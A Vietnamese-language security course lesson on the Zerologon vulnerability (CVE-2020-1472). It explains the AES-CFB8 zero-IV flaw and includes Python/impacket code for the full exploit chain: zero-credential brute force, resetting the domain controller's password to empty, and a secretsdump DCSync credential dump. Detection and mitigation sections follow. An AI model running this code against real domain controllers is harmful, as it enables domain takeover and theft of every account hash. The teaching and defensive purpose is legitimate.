---
title: "08. Zerologon — AES-CFB8 IV=0 Cryptographic Attack"
tags: [security, cve, landmark-cves, zerologon, netlogon, aes, cryptography, active-directory, lesson-08]
aliases: [Zerologon, CVE-2020-1472]
created: 2026-03-24
---

> **Prerequisites**: [[01-memory-model-exploit-primitives|01. Memory Model & Exploit Primitives]], khái niệm mã hóa đối xứng (AES), hiểu biết cơ bản về Windows Active Directory
> **Objectives**:
> - Hiểu MS-NRPC Netlogon authentication handshake đầy đủ
> - Phân tích toán học AES-CFB8 và tại sao IV=0 là thảm họa
> - Tính xác suất P(Encrypt(0...0) = 0...0) = 1/256 và ý nghĩa của nó
> - Hiểu chuỗi exploit 4 bước từ network access đến Domain Admin
> - Viết PoC Python dùng impacket để reproduce exploit
> - Phân tích Wireshark pcap của Zerologon traffic
> - Hiểu tại sao đây là "pure cryptographic flaw" — không cần memory bug, không cần credential

---

## Bối cảnh: Domain Admin Trong 3 Phút

Zerologon được phát hiện bởi Tom Tervoort tại Secura (Hà Lan), vá trong Patch Tuesday tháng 8/2020, và công bố technical details tháng 9/2020. CVSS score: **10.0** — tối đa.

Điều làm Zerologon exceptional:
- **Không cần credential**: hoàn toàn unauthenticated
- **Chỉ cần network access đến Domain Controller** trên port 135/445 (RPC)
- **Thời gian exploit**: trung bình ~3 phút (256 thử / giây)
- **Kết quả**: toàn quyền Domain Admin, có thể dump toàn bộ credential hash của domain
- **Bản chất**: pure cryptographic flaw — không có overflow, không có UAF, chỉ là dùng sai IV

Zerologon được khai thác rộng rãi trong thực tế bởi nhiều APT group, bao gồm những vụ tấn công vào cơ sở hạ tầng tối mật của chính phủ Mỹ khiến CISA phải ra Emergency Directive 20-04.

---

## Windows Active Directory & Netlogon

### Active Directory và Domain Controller

Active Directory (AD) là hệ thống quản lý danh tính và xác thực của Windows domain. **Domain Controller (DC)** là server lưu trữ AD database và xử lý toàn bộ authentication request.

Mọi máy tính Windows join domain đều có một **machine account** trong AD — một account đặc biệt với password tự động rotate 30 ngày một lần.

### MS-NRPC — Netlogon Remote Protocol

Netlogon (MS-NRPC) là giao thức RPC dùng để:
- Xác thực machine account với Domain Controller
- Thiết lập **Netlogon Secure Channel** — kênh mã hóa giữa máy tính và DC
- Truyền NTLM authentication request từ member server đến DC
- Đồng bộ database giữa các DC

Handshake thiết lập Netlogon Secure Channel:

```text
Client (member machine)              Domain Controller
  │                                        │
  │── NetrServerReqChallenge ─────────────▶│
  │   ClientChallenge: random 8 bytes      │
  │◀── ServerChallenge: random 8 bytes ────│
  │                                        │
  │   [Cả hai bên tính SessionKey]         │
  │   SessionKey = HMAC-MD5(                │
  │       ClientChallenge || ServerChallenge,
  │       NT_hash(MachinePassword)         │
  │   )                                    │
  │                                        │
  │── NetrServerAuthenticate3 ────────────▶│
  │   ClientCredential = ComputeNetlogonCredential(
  │       ClientChallenge, SessionKey)     │
  │   NegotiateFlags: 0x212FFFFF           │
  │◀── ServerCredential ───────────────────│
  │   (nếu đúng → Secure Channel thiết lập)│
```

`ComputeNetlogonCredential` là hàm mã hóa ClientChallenge bằng SessionKey — và đây chính là chỗ có bug.

---

## AES-CFB8 — Lý Thuyết Cần Biết

### AES Block Cipher

AES (Advanced Encryption Standard) là block cipher với block size = 128 bits (16 bytes). Nó nhận một block plaintext 16 bytes và một key (128/192/256 bits) → trả về ciphertext 16 bytes.

### CFB8 Mode — 8-bit Cipher Feedback

CFB8 là một mode of operation cho phép encrypt data theo từng byte (không cần đủ 16 bytes):

```text
CFB8 Encrypt (từng byte):
  Input: plaintext P[0], P[1], P[2], ..., P[n-1]
  Key: K (128 bits)
  IV: 16 bytes (initialization vector)

  Register SR = IV    ← Shift Register, ban đầu = IV

  For each byte P[i]:
    O = AES_Encrypt(SR, K)    ← Encrypt shift register
    C[i] = P[i] XOR O[0]     ← XOR với byte đầu của output
    SR = SR[1..15] || C[i]    ← Shift left, thêm C[i] vào cuối
```

Minh họa bằng diagram:

```text
          ┌─────────────────────────────────────────┐
          │        Shift Register (16 bytes)        │
          │  IV[0] IV[1] ... IV[14] IV[15]          │
          └──────────────────┬──────────────────────┘
                             │
                    AES_Encrypt(SR, Key)
                             │
                             ▼
                    ┌─────────────────┐
                    │ 16-byte output  │
                    └──────┬──────────┘
                           │  byte [0] only
                           ▼
    P[0] ─────────────► XOR ──────────────► C[0]
                           │
         ┌─────────────────┘  (C[0] appended to SR)
         ▼
    SR shifts: [IV[1] IV[2] ... IV[15] C[0]]
                             │
                    AES_Encrypt(new SR, Key)
                             ▼
                           byte [0]
    P[1] ─────────────► XOR ──────────────► C[1]
    ... và cứ thế tiếp tục
```

### Vấn đề với IV=0 trong CFB8

> [!definition] Definition 8.1 — IV trong CFB8
> IV (Initialization Vector) trong CFB8 là giá trị khởi tạo của Shift Register. **Yêu cầu bảo mật bắt buộc**: IV phải được chọn **ngẫu nhiên** mỗi lần encrypt với cùng một key. Nếu IV cố định, cùng plaintext → cùng ciphertext → không an toàn.
>
> MS-NRPC `ComputeNetlogonCredential` đặt IV = 16 bytes zero **hardcoded** — vi phạm hoàn toàn yêu cầu này.

### Tại sao P(Encrypt(0x00*8) = 0x00*8) = 1/256?

Đây là trái tim toán học của Zerologon. Phân tích từng bước:

```text
Ta cần encrypt 8 bytes = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
IV = [0x00, 0x00, ..., 0x00] (16 bytes zero)

Byte 0:
  SR = [0x00 × 16]   (IV)
  O = AES_Encrypt([0x00 × 16], SessionKey)  → O là 16 bytes ngẫu nhiên
  C[0] = P[0] XOR O[0] = 0x00 XOR O[0] = O[0]

  Để C[0] = 0x00 ta cần O[0] = 0x00.
  Xác suất: P(O[0] = 0x00) = 1/256  ← vì O là pseudorandom AES output

Nếu C[0] = 0x00:
  SR mới = [0x00 × 15, 0x00] = [0x00 × 16]  ← SR vẫn là all-zeros!

Byte 1:
  SR = [0x00 × 16]  (vẫn như cũ)
  O = AES_Encrypt([0x00 × 16], SessionKey)  ← CÙNG INPUT NHƯ BYTE 0
  C[1] = 0x00 XOR O[0] = O[0] = 0x00       ← đã biết O[0] = 0x00 rồi!

  → P(C[1] = 0x00 | C[0] = 0x00) = 1  (xác suất = 1!)

Bytes 2, 3, 4, 5, 6, 7: tương tự → P = 1 mỗi byte
```

> [!definition] Definition 8.2 — Zerologon Probability
> Cho plaintext = 8 bytes zero và IV = 16 bytes zero, xác suất để ciphertext = 8 bytes zero là:
>
> $$P(\text{Encrypt}_{K}(0^8) = 0^8 \mid \text{IV} = 0^{16}) = \frac{1}{256}$$
>
> Điều kiện: byte đầu tiên của $\text{AES}(0^{16}, K)$ phải bằng 0, xác suất $1/256$. Nếu điều kiện này thỏa mãn, tất cả 8 bytes tiếp theo tự động bằng 0 (vì SR không thay đổi). Với nhiều SessionKey khác nhau, mỗi SessionKey đều có xác suất $1/256$ — sau trung bình 256 attempts với 256 SessionKey khác nhau, ít nhất một lần thành công.

Minh họa bằng Python:

```python
from Crypto.Cipher import AES

def compute_netlogon_credential_vulnerable(input_bytes, session_key):
    """
    Mô phỏng ComputeNetlogonCredential với IV=0 (vulnerable).
    input_bytes: 8 bytes (ClientChallenge)
    session_key: 16 bytes
    """
    iv = b'\x00' * 16   # BUG: hardcoded zero IV
    cipher = AES.new(session_key, AES.MODE_CFB, iv=iv, segment_size=8)
    return cipher.encrypt(input_bytes)

def probability_demo():
    """
    Thống kê: với plaintext = 0*8, tần suất ciphertext = 0*8 là bao nhiêu?
    """
    from os import urandom
    total = 100_000
    success = 0
    plaintext = b'\x00' * 8

    for _ in range(total):
        key = urandom(16)   # SessionKey ngẫu nhiên
        ct = compute_netlogon_credential_vulnerable(plaintext, key)
        if ct == b'\x00' * 8:
            success += 1

    print(f"Thử {total:,} lần với random SessionKey:")
    print(f"Ciphertext = 0x00*8: {success} lần")
    print(f"Tỉ lệ thực nghiệm: 1/{total//success if success > 0 else 'inf'}")
    print(f"Tỉ lệ lý thuyết:   1/256")

probability_demo()
```

---

## Exploit Chain — 4 Bước Từ Network Access Đến Domain Admin

### Bước 1 — NetrServerReqChallenge với ClientChallenge = 0

Attacker gửi Netlogon request với `ClientChallenge = 0x00 * 8`:

```python
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport

def connect_to_dc(dc_ip, dc_name):
    """Kết nối đến Netlogon RPC endpoint của DC."""
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    return rpc_con

def step1_server_challenge(rpc_con, dc_name):
    """Gửi NetrServerReqChallenge với client challenge = zeros."""
    client_challenge = b'\x00' * 8
    resp = nrpc.hNetrServerReqChallenge(
        rpc_con,
        dc_name + '\x00',
        dc_name + '\x00',
        client_challenge
    )
    server_challenge = resp['ServerChallenge']
    print(f"[*] ServerChallenge: {server_challenge.hex()}")
    return client_challenge, server_challenge
```

### Bước 2 — Brute Force NetrServerAuthenticate3

Gửi `NetrServerAuthenticate3` với `ClientCredential = 0x00 * 8` liên tục. Về phía server, nó tính `SessionKey` từ machine account password (mà attacker không biết), rồi gọi `ComputeNetlogonCredential(ClientChallenge, SessionKey)`. Với IV=0 và ClientChallenge=0, xác suất output = 0 là 1/256:

```python
def step2_brute_force_auth(rpc_con, dc_name, target_computer):
    """
    Gửi NetrServerAuthenticate3 lặp lại với ClientCredential=0.
    Mỗi lần thất bại → server tạo ServerChallenge mới → SessionKey mới
    → 1/256 cơ hội thành công.
    Trung bình: 256 attempts ~ vài giây.
    """
    client_credential = b'\x00' * 8

    for attempt in range(2000):
        client_challenge, server_challenge = step1_server_challenge(
            rpc_con, dc_name
        )

        try:
            resp = nrpc.hNetrServerAuthenticate3(
                rpc_con,
                dc_name + '\x00',
                target_computer + '$\x00',   # machine account name
                nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                target_computer + '\x00',
                client_credential,           # 0x00 * 8
                0x212FFFFF                   # NegotiateFlags
            )

            if resp['ErrorCode'] == 0:
                print(f"[+] Authentication SUCCESS after {attempt+1} attempts!")
                return True, attempt + 1

        except Exception:
            pass

        if attempt % 50 == 0:
            print(f"    Attempt {attempt}/2000...")

    print("[-] Brute force failed after 2000 attempts")
    return False, 2000
```

### Bước 3 — Set DC Password Thành Empty

Sau khi auth thành công (Secure Channel được thiết lập), attacker gọi `NetrServerPasswordSet2` để đặt machine account password của DC thành empty string:

```python
def step3_set_empty_password(rpc_con, dc_name, target_computer):
    """
    Dùng Secure Channel vừa thiết lập để reset machine account password.
    Gọi NetrServerPasswordSet2 với password = empty string (encoded).
    """
    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
    authenticator['Credential'] = b'\x00' * 8
    authenticator['Timestamp'] = 0

    new_password = nrpc.NL_TRUST_PASSWORD()
    new_password['Buffer'] = b'\x00' * 512  # empty password, null-padded
    new_password['Length'] = 0

    resp = nrpc.hNetrServerPasswordSet2(
        rpc_con,
        dc_name + '\x00',
        target_computer + '$\x00',
        nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
        target_computer + '\x00',
        authenticator,
        new_password
    )

    if resp['ErrorCode'] == 0:
        print(f"[+] DC machine account password set to EMPTY!")
        print(f"    Target: {target_computer}$")
        return True
    return False
```

### Bước 4 — DCSync và Credential Dump

Machine account password của DC giờ là empty. Attacker có thể login như DC machine account (với empty password) và thực hiện **DCSync** — giả vờ là một DC khác đang yêu cầu replication → DC thật trả về toàn bộ password hash của domain:

```python
def step4_dcsync_credentials(dc_ip, dc_name, target_computer):
    """
    Dùng impacket secretsdump để DCSync.
    Kết quả: toàn bộ NTLM hash của domain, bao gồm Administrator.
    """
    import subprocess

    cmd = [
        "python3", "-m", "impacket.examples.secretsdump",
        "-just-dc",
        "-no-pass",
        f"{target_computer}$@{dc_ip}",
    ]

    print(f"[*] Running DCSync: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)

    if result.returncode == 0:
        print("[+] DCSync successful!")
        print(result.stdout[:2000])
    else:
        print(f"[-] DCSync failed: {result.stderr[:500]}")

    return result.stdout
```

### Full Exploit (dirkjanm PoC logic)

```python
def zerologon_exploit(dc_ip, dc_name, target_computer, restore=True):
    """
    Exploit đầy đủ CVE-2020-1472.

    CẢNH BÁO: Đặt empty password cho DC machine account có thể
    làm đứt domain trust relationships. LUÔN restore sau khi test!

    dc_ip: IP của Domain Controller
    dc_name: NetBIOS name của DC (ví dụ: "DC01")
    target_computer: tên computer account muốn tấn công (thường = dc_name)
    restore: nếu True, khôi phục password cũ sau khi exploit
    """
    print(f"[*] Starting Zerologon exploit")
    print(f"[*] Target: {target_computer}$ @ {dc_ip}")
    print()

    rpc_con = connect_to_dc(dc_ip, dc_name)

    success, attempts = step2_brute_force_auth(rpc_con, dc_name, target_computer)
    if not success:
        return False

    print(f"[*] Secure channel established. Now setting empty password...")
    if not step3_set_empty_password(rpc_con, dc_name, target_computer):
        return False

    print(f"\n[*] Running DCSync to dump credentials...")
    hashes = step4_dcsync_credentials(dc_ip, dc_name, target_computer)

    if restore:
        print("\n[!] IMPORTANT: Restoring original DC password...")
        print("[!] Use dirkjanm's restore tool: python3 restorepassword.py")
        print("[!] Without restore, the DC may lose domain trust!")

    return True
```

> [!warning] Quan trọng — Restore sau Exploit
> Zerologon đặt machine account password của DC thành empty. Nếu không restore, DC mất trust relationships với các member machines → domain có thể bị gián đoạn. **Luôn luôn restore sau khi test trong lab**. dirkjanm cung cấp `restorepassword.py` trong repo CVE-2020-1472.

---

## Tại sao IV=0 là Sai Về Mặt Mật Mã?

> [!definition] Definition 8.3 — Nguyên lý IV trong Symmetric Cipher Modes
> Các chế độ hoạt động (mode of operation) như CFB, CBC, CTR, GCM đều yêu cầu IV ngẫu nhiên và **duy nhất** cho mỗi lần encrypt với cùng key. Lý do:
>
> Nếu IV cố định: hai plaintext giống nhau → hai ciphertext giống nhau. Attacker có thể nhận ra pattern, predict output, hoặc như Zerologon — brute force dựa trên statistical property.
>
> Nếu IV tái sử dụng với GCM mode: thậm chí còn nghiêm trọng hơn — attacker có thể recover plaintext và forge authentication tag (GCM nonce reuse attack).

### So sánh IV=0 vs IV=random trong Zerologon

| Scenario | SessionKey | P(Encrypt(0^8) = 0^8) | Exploit feasible? |
|----------|------------|----------------------|-------------------|
| IV = 0 (vulnerable) | Random (unknown to attacker) | **1/256** | **Có** — 256 attempts |
| IV = random | Random (unknown to attacker) | 1/2^128 | Không — securely random |
| IV = 0 (vulnerable) | Known (attacker knows password) | Deterministic | N/A (auth không cần exploit) |

Với IV ngẫu nhiên 16 bytes, xác suất để Encrypt(0^8) = 0^8 là $1/2^{128}$ — không feasible để brute force.

---

## Wireshark Analysis — Nhận Dạng Zerologon

### Filter Netlogon traffic

```text
dcerpc && dcerpc.cn_call_id
```

Hoặc cụ thể hơn:

```text
netlogon
```

### Dấu hiệu trong pcap

```text
Zerologon attack pattern:
1. Nhiều NetrServerReqChallenge từ cùng một source IP trong thời gian ngắn
   (mỗi attempt cần một challenge mới)

2. NetrServerAuthenticate3 với:
   ClientCredential = 00:00:00:00:00:00:00:00   ← dấu hiệu chính
   NegotiateFlags = 0x212FFFFF                   ← flags specific to exploit

3. Sau khi thành công:
   NetrServerPasswordSet2 xuất hiện
   → đây là dấu hiệu exploit đã thành công

4. Sau đó: DRSUAPI replication requests
   (DCSync — yêu cầu replication credential data)
```

### Python analyzer

```python
from impacket import ImpactDecoder
from impacket.dot11 import Dot11, Dot11AssoReq

def analyze_zerologon_pcap(pcap_file):
    """
    Phân tích pcap để tìm dấu hiệu Zerologon.
    Dùng tshark để extract các trường quan trọng.
    """
    import subprocess

    cmd = [
        "tshark", "-r", pcap_file,
        "-Y", "netlogon",
        "-T", "fields",
        "-e", "ip.src",
        "-e", "netlogon.opnum",
        "-e", "netlogon.client_challenge",
        "-e", "frame.time_relative",
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)
    lines = result.stdout.strip().split('\n')

    zero_challenge_count = 0
    server_auth_count = 0

    print("Netlogon operations:")
    for line in lines[:50]:
        parts = line.split('\t')
        if len(parts) >= 3:
            src, opnum, challenge = parts[0], parts[1], parts[2] if len(parts) > 2 else ""
            opname = {
                "0": "NetrServerReqChallenge",
                "26": "NetrServerAuthenticate3",
                "30": "NetrServerPasswordSet2",
            }.get(opnum, f"op#{opnum}")

            if challenge and all(c in '00' for c in challenge.replace(':', '')):
                zero_challenge_count += 1
                print(f"  [!] {src} → {opname} | ClientCredential=ZEROS")
            else:
                print(f"  {src} → {opname}")

    if zero_challenge_count > 10:
        print(f"\n[!] WARNING: {zero_challenge_count} requests with zero credentials!")
        print("[!] This is a strong indicator of Zerologon exploitation attempt.")

    return zero_challenge_count
```

---

## Detection và Mitigation

### Event Log Indicators

```text
Event ID 4742: "A computer account was changed"
  → Xem Logon Type và Changed Attributes → New UAC Value
  → Nếu Changed bởi Anonymous Logon = đang bị exploit

Event ID 5805: "The session setup from the computer <name> failed to authenticate"
  → Nhiều failures liên tiếp = brute force attempt

Event ID 4624: Logon Type 3 (Network) từ machine account của DC
  → Sau Zerologon, attacker logon bằng empty password

NETLOGON error 0xc0000022: STATUS_ACCESS_DENIED liên tiếp
  → Sau đó một lần SUCCESS = exploit thành công
```

### Detection Script (PowerShell)

```powershell
# Tìm Event ID 4742 với Changed bởi Anonymous
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4742
    StartTime = (Get-Date).AddHours(-24)
} | Where-Object {
    $_.Message -match 'Anonymous' -or
    $_.Message -match 'ANONYMOUS LOGON'
} | Format-List TimeCreated, Message
```

### Mitigation

```text
1. Patch ngay: KB4571694 (August 2020 Patch Tuesday)
   → Đây là fix bắt buộc

2. Enable FullSecureChannelProtection:
   [HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters]
   FullSecureChannelProtection = 1
   → Reject tất cả unsigned Netlogon session

3. Monitor Netlogon failures (Event ID 5805) và rate-limit:
   Nhiều failures liên tiếp từ một IP → block

4. Network segmentation:
   Chỉ cho phép trusted machines kết nối đến DC port 135/445/49152+
   Block từ workstation thẳng đến DC nếu không cần thiết

5. Patch phase 2 (February 2021): KB4577551
   → Enforce mode — từ chối tất cả non-Windows insecure Netlogon session
```

---

## Zerologon vs Các CVE Khác — Điểm Đặc Biệt

Zerologon là ví dụ thuần túy nhất về **cryptographic implementation flaw**:

| Đặc điểm | Zerologon | Heartbleed | EternalBlue |
|----------|-----------|------------|-------------|
| Loại lỗi | Crypto flaw (IV=0) | Memory: bounds check | Integer overflow |
| Memory corruption | Không | Không (over-read) | Có |
| Pre-auth | Có | Có | Có |
| Crash risk | Thấp | Không | Cao (BSOD) |
| Exploit reliability | ~1/256 per try = 100% | 100% | ~70% |
| Thời gian exploit | ~3 phút | Vài giây | ~30 giây |
| Impact | Domain Admin | Key/cred leak | SYSTEM shell |

---

## Summary

- MS-NRPC Netlogon dùng `ComputeNetlogonCredential` với AES-CFB8, IV hardcoded = 16 bytes zero — vi phạm nguyên tắc cơ bản của mật mã
- IV=0 → khi plaintext = 8 bytes zero → xác suất ciphertext = 8 bytes zero là **1/256**
- Nếu condition này thỏa → Shift Register không thay đổi → tất cả bytes sau đều zero
- Attacker gửi `NetrServerAuthenticate3` với ClientCredential=0 lặp lại → trung bình 256 attempts → authenticate thành công mà không biết machine password
- Sau auth: `NetrServerPasswordSet2` đặt DC machine password thành empty
- Sau đó: DCSync dump toàn bộ domain hashes → pass-the-hash → Domain Admin
- Fix: validate rằng IV ngẫu nhiên + enforce signed/sealed Netlogon channel
- **Lớp lỗ hổng**: Cryptographic misuse (fixed IV) — không cần memory bug, không cần credential

---

## References

- Secura whitepaper (Tom Tervoort): https://www.secura.com/pathtoimg.php?id=2055
- dirkjanm PoC: https://github.com/dirkjanm/CVE-2020-1472
- Microsoft advisory: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472
- impacket: https://github.com/fortra/impacket
- CrowdStrike analysis: https://www.crowdstrike.com/blog/cve-2020-1472-zerologon-security-advisory/
- CISA Emergency Directive 20-04: https://www.cisa.gov/news-events/directives/ed-20-04
